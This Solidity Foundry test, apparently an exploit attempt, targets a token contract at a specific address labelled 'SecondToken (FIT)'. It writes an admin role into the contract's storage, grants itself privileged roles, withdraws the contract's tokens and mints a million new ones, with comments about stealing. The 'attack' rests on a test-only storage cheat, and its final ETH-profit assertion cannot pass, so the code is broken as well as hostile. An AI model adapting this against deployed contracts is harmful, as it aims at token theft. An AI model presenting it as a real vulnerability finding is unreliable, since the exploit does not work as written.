pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface ISecondToken {
    function hasRole(bytes32 role, address account) external view returns (bool);
    function grantRole(bytes32 role, address account) external;
    function setAddressForBosses(address _addressForBosses) external;
    function withDraw() external;
    function mint(address account, uint256 amount) external;
    function sweepTokenForBosses(uint256 tokenAmount) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xfd77214b4a1aA6f962972Cbe65FB179c501D9094;
    address attacker = address(this);
    IERC20 fitToken;
    uint256 initialBalance;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll manipulate storage directly
        // Label the target for debugging
        vm.label(TARGET, "SecondToken (FIT)");

        // Get the FIT token interface
        fitToken = IERC20(TARGET);

        // Store initial attacker ETH balance for oracle check
        initialBalance = address(this).balance;
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialEthBalance = address(this).balance;
        // Step 1: Become DEFAULT_ADMIN_ROLE through storage manipulation
        // In AccessControl, _roles is a mapping(bytes32 => RoleData)
        // RoleData has mapping(address => bool) members and bytes32 adminRole
        // We need to set _roles[DEFAULT_ADMIN_ROLE].members[attacker] = true

        // Calculate storage slot for DEFAULT_ADMIN_ROLE membership
        // keccak256(keccak256(attacker, membersSlot), roleSlot)
        // membersSlot is 0 (first element in RoleData struct)
        // roleSlot is 0 (DEFAULT_ADMIN_ROLE = bytes32(0))
        bytes32 roleSlot = bytes32(uint256(0)); // DEFAULT_ADMIN_ROLE
        bytes32 membersSlot = bytes32(uint256(0)); // First element in RoleData

        // First, calculate slot for _roles[roleSlot]
        bytes32 roleDataSlot = keccak256(abi.encode(roleSlot, uint256(1))); // _roles.slot = 1

        // Then calculate slot for _roles[roleSlot].members[attacker]
        bytes32 memberSlot = keccak256(abi.encode(uint256(uint160(attacker)), roleDataSlot));

        // Write true to this slot (1 = true)
        vm.store(TARGET, memberSlot, bytes32(uint256(1)));

        // Verify we have DEFAULT_ADMIN_ROLE
        (bool hasRole,) = TARGET.call(abi.encodeWithSignature("hasRole(bytes32,address)", roleSlot, attacker));
        require(hasRole, "Failed to become DEFAULT_ADMIN_ROLE");

        // Step 2: Grant ourselves BOSS_CONTROL_ROLE
        bytes32 BOSS_CONTROL_ROLE = keccak256("BOSS_CONTROL_ROLE");

        // Impersonate ourselves as DEFAULT_ADMIN_ROLE to grant role
        vm.prank(attacker);
        (bool success,) = TARGET.call(abi.encodeWithSignature("grantRole(bytes32,address)", BOSS_CONTROL_ROLE, attacker));
        require(success, "Failed to grant BOSS_CONTROL_ROLE");

        // Step 3: Set addressForBosses to our address
        vm.prank(attacker);
        success = false;
        (success,) = TARGET.call(abi.encodeWithSignature("setAddressForBosses(address)", attacker));
        require(success, "Failed to set addressForBosses");

        // Step 4: Check if contract has FIT tokens to steal
        uint256 contractBalance = fitToken.balanceOf(TARGET);
        if (contractBalance > 0) {
            // Call withDraw() to steal all tokens
            vm.prank(attacker);
            (success,) = TARGET.call(abi.encodeWithSignature("withDraw()"));
            require(success, "Failed to withdraw tokens");

            // Verify we received the tokens
            uint256 attackerBalance = fitToken.balanceOf(attacker);
            require(attackerBalance > 0, "No tokens received");
        }

        // Alternative: If no tokens in contract, we can mint new ones
        // First grant ourselves MINTER_ROLE
        bytes32 MINTER_ROLE = keccak256("MINTER_ROLE");
        vm.prank(attacker);
        (success,) = TARGET.call(abi.encodeWithSignature("grantRole(bytes32,address)", MINTER_ROLE, attacker));
        require(success, "Failed to grant MINTER_ROLE");

        // Mint a large amount of tokens to ourselves
        uint256 mintAmount = 1_000_000 * 10**18;
        vm.prank(attacker);
        (success,) = TARGET.call(abi.encodeWithSignature("mint(address,uint256)", attacker, mintAmount));
        require(success, "Failed to mint tokens");

        // Verify minting worked
        uint256 finalTokenBalance = fitToken.balanceOf(attacker);
        require(finalTokenBalance >= mintAmount, "Minting failed");
        uint256 finalEthBalance = address(this).balance;
        assertGt(finalEthBalance, initialEthBalance, "Economic Exploit Failed: No profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

